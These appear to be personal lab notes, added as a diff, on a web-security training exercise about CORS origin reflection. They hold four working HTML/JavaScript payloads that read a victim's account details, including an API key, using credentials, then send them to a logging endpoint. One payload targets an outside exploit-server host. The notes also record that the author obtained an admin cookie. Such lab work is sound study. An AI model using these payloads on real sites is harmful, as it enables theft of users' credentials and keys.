@@ -1,0 +1,100 @@
+
+[ WEB > CORS ]
+
+CORS vulnerability with basic origin reflection
+
+// after login, ajax request made to target to obtain api key
+request:
+GET /accountDetails HTTP/2
+response:
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "1y3F2j6UBWPo80vBtornT197A0PdEjmW",
+  "sessions": [
+    "Jror0Fsi0ySPlCkLLp5a9bxZVKuUx3pZ"
+  ]
+}
+
+// response contains a header that hints that CORS is allowed
+Access-Control-Allow-Credentials: true
+
+// if we add an Origin header, it is reflected in the response,
+// with the Access-Control-Allow-Origin header
+// this indicates that the target may support CORS...
+// CORS tldr refresher: loading resources from other domains, etc.
+request:
+Origin: https://daniel.test
+response:
+Access-Control-Allow-Origin: https://daniel.test
+
+// example payload to host on attack infra:
+// ATTEMPT 1
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://0ad7000d034e958f81ef627a009f005b.web-security-academy.net/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+
+  function reqListener() {
+      location='/log?key='+this.responseText;
+  };
+</script>
+
+// ATTEMPT 2
+<html>
+<body>
+<script>
+  var xhr = new XMLHttpRequest();
+  var url = "https://0ad7000d034e958f81ef627a009f005b.web-security-academy.net/";
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+      fetch("/log?key=" + xhr.responseText);
+    }
+  }
+  xhr.open('GET', url + "/accountDetails", true);
+  xhr.withCredentials = true;
+  xhr.send(null)
+</script>
+</body>
+</html>
+
+// ATTEMPT 3
+<html>
+<body>
+<script>
+  const request = new XMLHttpRequest()
+  request.open('get', 'https://0ad7000d034e958f81ef627a009f005b.web-security-academy.net/accountDetails', true)
+  request.onload = () => {
+    window.location.href = "/log?key=" + request.responseText
+  }
+  request.withCredentials = true
+  request.send()
+</script>
+</body>
+</html>
+
+// ATTEMPT 4
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://0ad7000d034e958f81ef627a009f005b.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+location='https://exploit-0a08004b030795948125611b01c30041.exploit-server.net/log?key='+this.responseText;
+};
+</script>"></iframe>
+
+// okay, so apparently, there's issues with this lab on modern browsers now...
+// i tired firefox, chromium, and chrome with all payloads.
+// no luck...
+// actually, i take that back:
+// it worked in chrome, and i got the admin cookie.
+// however, it never said i solved the challenge
+// even after delivering the payload and logging
+// in as admin...
+
+
